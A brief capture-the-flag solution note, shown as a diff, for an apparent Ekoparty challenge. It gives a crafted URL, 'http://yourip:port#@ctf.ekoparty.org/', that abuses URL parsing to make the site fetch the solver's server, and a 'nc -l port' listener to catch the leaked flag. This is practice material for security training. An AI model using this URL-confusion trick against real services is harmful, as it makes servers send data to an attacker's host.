@@ -1,0 +1,9 @@
+In the site, submit:
+
+http://yourip:port#@ctf.ekoparty.org/
+
+On your server (w/ yourip):
+
+nc -l port 
+
+to get the flag.
